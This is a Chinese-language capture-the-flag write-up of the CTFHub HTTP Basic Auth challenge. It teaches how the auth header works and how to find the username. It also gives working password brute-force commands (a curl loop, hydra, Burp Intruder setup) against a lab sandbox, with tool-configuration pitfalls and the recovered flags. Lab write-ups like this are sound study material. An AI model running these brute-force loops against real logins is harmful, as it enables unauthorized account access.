# CTFHub · 基础认证（HTTP Basic Auth 弱口令爆破）

> 靶场：CTFHub 技能树 · Web · 密码口令 / 基础认证
> 日期：2026-10-17
> 考点：**HTTP Basic Auth 的认证机制 + 字典爆破 + 工具配置排错**

---

## 一、题目长什么样

```
http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/

附件：100 个密码的字典（rockyou Top 100）
      123456
      password
      line
      ...
      987654321
      dallas
      austin
      thunder
      taylor
```

**只给密码，不给用户名** —— 这是第一个信号：**用户名要么能猜，要么有地方泄露。**

---

## 二、发现过程（三步）

### 第 1 步：读首页源码

```bash
curl -s http://challenge-xxx:10800/
```

```html
<html>
<head>
<meta charset="UTF-8"/>
<title>Basic Auth</title>                    ← ① 题型：Basic Auth
</head>
<body>
    <h1>CTFHub 基础认证</h1>
    <div>
        Here is your flag: <a href="/flag.html">click</a>   ← ② 目标：/flag.html
    </div>
</body>
</html>
```

| 看到 | 推断 |
|---|---|
| `<title>Basic Auth</title>` | 不是表单登录，是 **HTTP 基础认证** |
| `<a href="/flag.html">` | 真正的目标是 **`/flag.html`** |

> ⚠️ 这一步很多人会跳过，直接去爆 `index.php` / 猜 `/login.php` —— 全是 404。
> **先读首页源码，它往往直接告诉你目标路径。**

### 第 2 步：访问目标，看它要什么

```bash
curl -i http://challenge-xxx:10800/flag.html
```

```http
HTTP/1.1 401 Unauthorized
Server: openresty/1.21.4.2
Content-Type: text/html; charset=utf-8
Content-Length: 179
WWW-Authenticate: Basic realm="Do u know admin ?"    ← ③ 用户名在这
```

| 看到 | 含义 |
|---|---|
| `401 Unauthorized` | 需要认证 |
| `WWW-Authenticate: Basic` | 认证方式是 **HTTP Basic Auth** |
| **`realm="Do u know admin ?"`** | ⭐ **用户名 = `admin`** |

### 第 3 步：读懂 realm 里的线索

`realm` 原本是"给用户看的认证域说明"（浏览器登录框里会显示这句）。**出题人把它当提示牌用了。**

```
Basic realm="Do u know admin ?"
                    └────┬────┘
                    用户名 = admin
```

**验证一下**（拿几个常见密码试 `admin`）：

```bash
for p in 123456 password admin 12345678; do
  printf "admin:%-10s -> " "$p"
  curl -s -o /dev/null -w "%{http_code}\n" -u "admin:$p" "$T/flag.html"
done
```

```
admin:123456     -> 401
admin:password   -> 401
admin:admin      -> 401
admin:12345678   -> 401
```

**全 401，但这是好消息** —— 说明服务器在正常响应认证（不是缺参数、不是方法错）。
**用户名 `admin` 确认，剩下只爆密码。**

---

## 三、原理：Basic Auth 到底发什么

### 协议流程

```
① 浏览器 GET /flag.html
        ↓
② 服务器: 401 + WWW-Authenticate: Basic realm="..."
        ↓
③ 浏览器弹出【原生登录框】（不是网页，是系统对话框）
        ↓
④ 用户输入 admin / sunshine
        ↓
⑤ 浏览器拼接 "admin:sunshine" → Base64 编码
        ↓
⑥ 发送: Authorization: Basic YWRtaW46c3Vuc2hpbmU=
        ↓
⑦ 服务器 Base64 解码 → 比对 → 对了返回 200
```

### 核心公式

```
Authorization: Basic  base64( 用户名 : 密码 )
```

```bash
printf 'admin:sunshine' | base64        # YWRtaW46c3Vuc2hpbmU=
echo YWRtaW46c3Vuc2hpbmU= | base64 -d   # admin:sunshine
```

### ⭐ 一个必记的常数

```bash
printf 'admin:' | base64    # YWRtaW46
```

**`base64("admin:")` 恒等于 `YWRtaW46`。**

> **所有合法的 `Authorization: Basic` 值，都必须以 `YWRtaW46` 开头。**
>
> 这是**排错的第一把钥匙** —— 后面第 5 节会用它区分"配置错"和"密码错"。

### Base64 不是加密

```bash
echo YWRtaW46c3Vuc2hpbmU= | base64 -d   # 任何人拿到 header 就能还原
```

**所以 Basic Auth 必须跑在 HTTPS 上**，否则密码等于明文在网上传输。

---

## 四、爆破

### 方法 A：curl（最快，20 秒）

```bash
T="http://challenge-xxx:10800"
WL=pass.txt

i=0
while IFS= read -r pw; do
  [ -z "$pw" ] && continue
  i=$((i+1))
  code=$(curl -s -o /tmp/f -m 8 -u "admin:$pw" -w "%{http_code}" "$T/flag.html")
  if [ "$code" = "200" ]; then
    echo "✅ 第 $i 个命中: admin:$pw"
    grep -o 'ctfhub{[^}]*}' /tmp/f
    break
  fi
  [ $((i % 20)) -eq 0 ] && echo "   ...已试 $i 个"
done < "$WL"
```

`-u "admin:$pw"` 会自动做 base64 拼接并加 `Authorization` 头。

**实际输出：**

```
   ...已试 20 个
   ...已试 40 个
✅ 第 50 个命中: admin:sunshine
   ctfhub{b227a7576366a4be3848faa5}
```

### 方法 B：hydra（专业工具）

```bash
hydra -l admin -P pass.txt challenge-xxx.sandbox.ctfhub.com -s 10800 http-get /flag.html
```

### 方法 C：Burp Intruder（要看完整请求/响应时用）

#### ① 抓请求

```
Proxy → Intercept is on
浏览器访问 /flag.html → 弹登录框 → 填 admin / 随便一个密码
Burp 抓到:
    GET /flag.html HTTP/1.1
    Authorization: Basic YWRtaW46dGVzdA==
```

> ⚠️ **用户名要填真的 `admin`**，别随手打 `11111` —— 见第 5 节坑 A。

#### ② 发到 Intruder + 设位置

```
右键 → Send to Intruder（Ctrl+I）

Positions:
    Attack type: Sniper
    先点【Clear §】清掉所有自动标记
    再手动框选整段 base64，点【Add §】

结果:
    Authorization: Basic §YWRtaW46dGVzdA==§
                      ↑                  ↑
                  只有这一处 §
```

#### ③ Payloads

```
Payload set: 1
Payload type: Simple list
Load → pass.txt（应显示 100 条）
```

#### ④ ⭐ Payload Processing —— 两条规则，顺序不能反

```
┌────────────────────────────────────────┐
│ Rule 1: Add prefix    →  admin:        │  ← 必须先做
│ Rule 2: Base64-encode →  (默认参数)     │  ← 必须后做
└────────────────────────────────────────┘
```

#### ⑤ ⚠️ 关掉 URL 编码

```
Payloads → Payload options
    ☐ URL-encode these characters      ← 必须取消勾选
```

理由见第 5 节坑 B。

#### ⑥ 找结果

```
① 点 Status 列表头排序 → 200 排最前
② 或 Results 上方 Filter → Status code → 输入 200
③ 或点某行 → Response 标签看内容
```

也可以加 `Settings → Grep - Extract`，正则 `ctfhub\{[^}]+\}`，直接在表格里显示 flag。

---

## 五、两个坑（本题最有价值的部分）

### 坑 A：前缀照抄了抓包里的"随便填"用户名

浏览器登录框随手填了 `11111` / `111111`，抓到的请求是：

```http
Authorization: Basic MTExMTE6MTExMTEx
```

```bash
echo MTExMTE6MTExMTEx | base64 -d    # 11111:111111
```

**如果 Payload Processing 照抄 `11111:` 当前缀 → 全部 401。**

| 前缀写成 | 密码 `123456` 时发出去的值 | 说明 |
|---|---|---|
| ❌ `11111:` | `MTExMTE6MTIzNDU2` | 用户名错 |
| ✅ `admin:` | `YWRtaW46MTIzNDU2` | 格式对（密码错也 401） |

**判断：值是不是以 `YWRtaW46` 开头。**

### 坑 B：base64 结尾的 `=` 被 URL 编码

**字典 100 个密码里，有 44 个的 base64 带 `=`（填充）。** 其中包括**正确答案**：

```
不编码:  YWRtaW46c3Vuc2hpbmU=      → 200 ✅
被编码:  YWRtaW46c3Vuc2hpbmU%3D    → 401 ❌
```

**这造成了最恶心的一种现象：**

```
第 1~49 条   格式正常，密码不对   → 401（正常失败）
第 50 条     sunshine 被编码毁掉  → 401（假失败）★
第 51~100 条 格式正常，密码不对   → 401（正常失败）
        ↓
      100 条全 401
        ↓
看起来像"配置全错"
其实是"唯一正确答案被编码毁了"
```

**修法（二选一）：**

```
① Payload options → 取消勾选 URL-encode these characters

② Payload Processing 加第三条：
   Rule 3: Skip if matches regex
   正则: ^[A-Za-z0-9+/]+={0,2}$
   （整体是合法 base64 就跳过后续处理）
```

**验证**：在结果里 Ctrl+F 搜 `%3D`，搜到就说明编码没关。

### 坑 C：401 分不清"格式错"还是"密码错"

```
格式正确 + 密码错  →  401
格式错误 + 密码对  →  401   ← 也是 401！
```

**所以光看状态码无法判断配置对不对。**

**唯一可靠的判据：看 `Authorization` 的值是不是 `YWRtaW46` 开头、有没有 `%3D`。**

> **通用教训：渗透工具的"配置错"和"目标错"看起来一样时，必须找一个能验证格式的锚点。**

---

## 六、每实例密码不同（实测）

| 项 | 实例 1 `d41d4efc` | 实例 2 `686487d3` |
|---|---|---|
| 用户名 | `admin` | `admin` ← **固定** |
| **密码** | **`987654321`**（第 96 个） | **`sunshine`**（第 50 个） |
| base64 | `YWRtaW46OTg3NjU0MzIx` | `YWRtaW46c3Vuc2hpbmU=` |
| flag | `ctfhub{db7ba83bb0e787993a2fa43f}` | `ctfhub{b227a7576366a4be3848faa5}` |

**规律：**

```
实例创建时 → 从字典里随机抽一个密码 → 这个实例生命周期内【不变】
关掉重开   → 重新抽
```

**实测：隔 30 分钟复核同一实例，`sunshine` 仍然返回 200。**
**另一个实例同时间已经 404（过期）。**

> **实践含义：开实例 → 立刻爆 → 立刻记 flag → 别关。**
> CTFHub 环境有存活时间，今天已经因为过期丢了几次机会。

---

## 七、附录

### A1. base64 填充规则（为什么有的密码带 `=`）

```
待编码字节数 = 6（"admin:"） + 密码长度 L
base64 每 3 字节一组

(6 + L) % 3 == 0  →  无填充
(6 + L) % 3 == 1  →  两个 ==
(6 + L) % 3 == 2  →  一个 =

因为 6 % 3 == 0，所以等价于 L % 3：
L % 3 == 0  →  无填充      （如 dallas 6 字符、987654321 9 字符）
L % 3 == 1  →  ==
L % 3 == 2  →  =           （如 sunshine 8 字符、password 8 字符）
```

### A2. 本题字典里 base64 带 `=` 的 44 个密码

```
第  2 个 password    → YWRtaW46cGFzc3dvcmQ=
第  3 个 line        → YWRtaW46bGluZQ==
第  4 个 12345678    → YWRtaW46MTIzNDU2Nzg=
第  7 个 12345       → YWRtaW46MTIzNDU=
第  8 个 1234        → YWRtaW46MTIzNA==
第 10 个 1234567     → YWRtaW46MTIzNDU2Nw==
第 13 个 baseball    → YWRtaW46YmFzZWJhbGw=
第 15 个 football    → YWRtaW46Zm9vdGJhbGw=
第 17 个 letmein     → YWRtaW46bGV0bWVpbg==
第 22 个 qwertyuiop  → YWRtaW46cXdlcnR5dWlvcA==
第 24 个 mustang     → YWRtaW46bXVzdGFuZw==
第 25 个 1234567890  → YWRtaW46MTIzNDU2Nzg5MA==
第 26 个 michael     → YWRtaW46bWljaGFlbA==
第 28 个 pussy       → YWRtaW46cHVzc3k=
第 29 个 superman    → YWRtaW46c3VwZXJtYW4=
第 30 个 1qaz2wsx    → YWRtaW46MXFhejJ3c3g=
第 31 个 7777777     → YWRtaW46Nzc3Nzc3Nw==
第 32 个 fuckyou     → YWRtaW46ZnVja3lvdQ==
第 38 个 trustno1    → YWRtaW46dHJ1c3RubzE=
第 40 个 jennifer    → YWRtaW46amVubmlmZXI=
第 41 个 zxcvbnm     → YWRtaW46enhjdmJubQ==
第 50 个 sunshine    → YWRtaW46c3Vuc2hpbmU=       ★ 本题正确答案
第 51 个 iloveyou    → YWRtaW46aWxvdmV5b3U=
第 53 个 2000        → YWRtaW46MjAwMA==
第 54 个 charlie     → YWRtaW46Y2hhcmxpZQ==
第 60 个 starwars    → YWRtaW46c3RhcndhcnM=
第 61 个 klaster     → YWRtaW46a2xhc3Rlcg==
第 64 个 asshole     → YWRtaW46YXNzaG9sZQ==
第 65 个 computer    → YWRtaW46Y29tcHV0ZXI=
第 66 个 michelle    → YWRtaW46bWljaGVsbGU=
第 67 个 jessica     → YWRtaW46amVzc2ljYQ==
第 69 个 1111        → YWRtaW46MTExMQ==
第 72 个 11111111    → YWRtaW46MTExMTExMTE=
第 74 个 freedom     → YWRtaW46ZnJlZWRvbQ==
第 76 个 pass        → YWRtaW46cGFzcw==
第 77 个 fuck        → YWRtaW46ZnVjaw==
第 82 个 princess    → YWRtaW46cHJpbmNlc3M=
第 87 个 love        → YWRtaW46bG92ZQ==
第 89 个 6969        → YWRtaW46Njk2OQ==
第 91 个 chelsea     → YWRtaW46Y2hlbHNlYQ==
第 93 个 matthew     → YWRtaW46bWF0dGhldw==
第 95 个 yankees     → YWRtaW46eWFua2Vlcw==
第 99 个 thunder     → YWRtaW46dGh1bmRlcg==
```

**44 / 100 会被 URL 编码破坏** —— 这个比例足够高，所以"全 401"几乎必然是这个坑。

### A3. `§` 和 Payload Processing 的机制（最容易误解的地方）

```
字典值:  123456
    ↓ Rule 1  Add prefix "admin:"   →  admin:123456
    ↓ Rule 2  Base64-encode         →  YWRtaW46MTIzNDU2
    ↓
整体替换 § 之间【所有】内容:

    请求: Authorization: Basic §MTExMTE6MTExMTEx§
           └──────────┬──┘    └──────┬──────┘
                 原样保留         整个丢掉
                        ↓
    结果: Authorization: Basic YWRtaW46MTIzNDU2
```

**关键认知：**

| 位置 | 处理 |
|---|---|
| `§` **外面** | 原样保留（`Authorization: Basic ` 不动） |
| `§` **里面** | 完全替换（原文作废，只是占位符） |

**Add Prefix 加工的是"要塞进插槽的东西"（字典值），不是"插槽外面的请求"。**

**错序会怎样：**

```
123456 → Base64 → MTIzNDU2 → Add prefix "admin:" → admin:MTIzNDU2
发出去: Authorization: Basic admin:MTIzNDU2
                              └────┬────┘
                        不是合法 base64 → 401
```

### A4. 排错口诀（背下来）

```
① 值以 YWRtaW46 开头？        不是 → 前缀错 / 顺序反
② 值里有 %3D / %2B / %2F？    有   → URL 编码没关
③ 值结尾有 =？                有   → 尤其要检查第 ②
④ 都不对 → 用 Repeater 手动发一次已知凭据验证服务端
```

### A5. 三种工具对比

| 工具 | 100 个密码耗时 | 优点 | 缺点 |
|---|---|---|---|
| **curl 循环** | ~20 秒 | 快、可脚本化、易保存 | 无图形界面 |
| **Burp Intruder**（Community） | 1~2 分钟 | 能看完整请求/响应、能加规则 | 限速、要配代理 |
| **hydra** | ~10 秒 | 最快 | 参数不熟容易错 |

### A6. 一句话总结

> **Basic Auth 的"密码"在网络上传的只是 Base64，等于明文。**
> **所以只要有字典，爆破成本极低。**
>
> 而**配置 Basic Auth 的爆破工具时，第一个要检查的不是密码对不对，
> 而是"发出去的 base64 是不是以 `YWRtaW46` 开头、结尾的 `=` 有没有被编码"。**
